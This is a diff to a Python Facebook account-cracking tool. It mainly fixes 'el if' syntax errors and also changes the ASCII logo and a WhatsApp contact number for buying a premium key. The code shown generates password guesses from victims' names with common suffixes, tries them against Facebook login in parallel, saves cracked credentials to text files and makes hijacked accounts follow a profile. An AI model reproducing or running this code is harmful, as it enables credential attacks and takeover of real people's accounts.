@@ -128,7 +128,7 @@ def Public():
 		except requests.exceptions.ConnectionError:
 			print ( ' [×] Connection Timeout')
 			exit()
-	el if pil in ['2','02']:
+	elif pil in ['2','02']:
 		try:
 			cookie=input(" [+] Cookie : ")
 			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
@@ -179,7 +179,7 @@ def setting():
 		for tua in sorted(id):
 			id2.append(tua)
 
-	el if hu in ['2','02']:
+	elif hu in ['2','02']:
 		muda=[]
 		for bacot in sorted(id):
 			muda.append(bacot)
@@ -188,7 +188,7 @@ def setting():
 		for xmud in range(bcm):
 			id2.append(muda[bcmi])
 			bcmi -=1
-	el if hu in ['3','03']:
+	elif hu in ['3','03']:
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
@@ -200,7 +200,7 @@ def setting():
 	hc = input ("\n [#] method : ")
 	if hc in ['1','01']:
 		method.append('mobile')
-	el if hc in ['2','02']:
+	elif hc in ['2','02']:
 		method.append('free')
 	else:
 		method.append('mobile')
@@ -211,9 +211,9 @@ def passmenu():
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
-	el if passmen in ['2','02']:
+	elif passmen in ['2','02']:
 		name()
-	el if passmen in ['3','03']:
+	elif passmen in ['3','03']:
 		name2()
 	else:
 		passmenu()
@@ -241,7 +241,7 @@ def first():
 					pwv.append(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
-			el if 'free' in method:
+			elif 'free' in method:
 				pool.submit(free,idf,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
@@ -259,7 +259,7 @@ def name():
 					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
 				if 'mobile' in method:
 					pool.submit(crack,idf,pwv)
-				el if 'free' in method:
+				elif 'free' in method:
 					pool.submit(free,idf,pwv)
 				else:
 					pool.submit(crack,idf,pwv)
@@ -290,7 +290,7 @@ def name2():
 					pwv.append(frs+'786')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
-			el if 'free' in method:
+			elif 'free' in method:
 				pool.submit(free,idf,pwv)
 			else:
 				pool.submit(crack,idf,pwv)
@@ -319,7 +319,7 @@ def crack(idf,pwv):
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
-			el if "c_user" in ses.cookies.get_dict().keys():
+			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
@@ -357,7 +357,7 @@ def free(idf,pwv):
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
-			el if "c_user" in ses.cookies.get_dict().keys():
+			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print(f'\r\x1b[1;92m [ BALOCH-OK ] {idf} | {pw}')
@@ -379,12 +379,12 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m 
-\033[1;32m ╭━━━┳━━━┳━━━┳━━━┳━━━┳━━━━╮
-\033[1;33m ┃╭━╮┃╭━╮┃╭━╮┃╭━━┫╭━╮┃╭╮╭╮┃
-\033[1;32m ┃┃╱┃┃╰━╯┃┃╱┃┃╰━━┫┃╱┃┣╯┃┃╰╯
-\033[1;33m ┃╰━╯┃╭╮╭┫╰━╯┃╭━━┫╰━╯┃╱┃┃
-\033[1;32m ┃╭━╮┃┃┃╰┫╭━╮┃┃╱╱┃╭━╮┃╱┃┃
-\033[1;33m ╰╯╱╰┻╯╰━┻╯╱╰┻╯╱╱╰╯╱╰╯╱╰╯
+\033[1;91m              . ╭━━━┳━━━┳━━━┳━━━┳━━━┳━━━━╮
+\033[1;91m              . ┃╭━╮┃╭━╮┃╭━╮┃╭━━┫╭━╮┃╭╮╭╮┃
+\033[38;5;208m      . ┃┃╱┃┃╰━╯┃┃╱┃┃╰━━┫┃╱┃┣╯┃┃╰╯
+\033[38;5;208m      . ┃╰━╯┃╭╮╭┫╰━╯┃╭━━┫╰━╯┃╱┃┃
+\033[1;92m              . ┃╭━╮┃┃┃╰┫╭━╮┃┃╱╱┃╭━╮┃╱┃┃
+\033[1;92m             .  ╰╯╱╰┻╯╰━┻╯╱╰┻╯╱╱╰╯╱╰╯╱╰╯
                                               
 
 
@@ -417,10 +417,10 @@ class Main:
 		ARAFAT = input("\n\033[1;36m  Chose ==> \033[1;32m")
 		if ARAFAT in ["", " "]:
 			exit()
-		el if ARAFAT in ["2", "02"]:
+		elif ARAFAT in ["2", "02"]:
 			print("    Thanks🥰♥️")
 			exit()
-		el if ARAFAT in ["1", "01"]:
+		elif ARAFAT in ["1", "01"]:
 			os.system("xdg-open https://youtu.be/gxjhqkJL_h0")
 			print("")
 			time.sleep(2.0)
@@ -874,7 +874,7 @@ class Main:
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-ARAFAT -Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
-			el if "www.facebook.com" in response.json()["error_msg"]:
+			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ARAFAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-ARAFAT-OK.txt","a").write(" %s | %s\n"%(uid, pw))
@@ -1301,7 +1301,7 @@ class Main:
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-ARAFAT-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
-			el if "www.facebook.com" in response.json()["error_msg"]:
+			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[0;92m[ARAFAT-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-ARAFAT-OK.txt","a").write(" %s | %s\n"%(uid, pw))
@@ -1347,7 +1347,7 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+8801749953660?text=' + tks)
+		os.system('am start https://wa.me/+880173578770?text=' + tks)
 		Subscraption()        
 Subscraption()
 
